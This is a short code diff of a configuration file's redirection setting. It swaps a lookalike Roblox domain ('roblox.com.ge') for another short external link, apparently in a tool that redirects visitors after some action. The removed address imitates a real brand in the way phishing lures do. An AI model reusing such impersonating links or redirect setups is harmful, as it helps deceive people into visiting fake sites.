@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://roblox.com.ge/games/1962086868/Tower-of-Hell?privateServerLinkCode=41718512149884147772456454344941" # Link to the webpage to redirect to 
+        "page": "https://rage.wtf/3xp" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
